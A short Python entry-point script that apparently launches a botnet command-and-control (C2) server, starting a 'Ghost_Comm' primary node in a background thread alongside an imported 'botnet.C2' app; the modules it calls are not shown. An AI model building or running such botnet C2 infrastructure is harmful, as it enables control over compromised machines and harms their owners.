import threading
from ghost_comm_lib.primary_node.primary_node import PrimaryNode
from botnet.C2 import app as c2_app, main as c2_main

def main():
    """Main function to run the C2 server."""
    # Start the Ghost_Comm PrimaryNode in a separate thread
    primary_node = PrimaryNode()
    primary_node_thread = threading.Thread(target=primary_node.start_server)
    primary_node_thread.daemon = True
    primary_node_thread.start()

    # Start the C2 server
    c2_main()

if __name__ == "__main__":
    main()
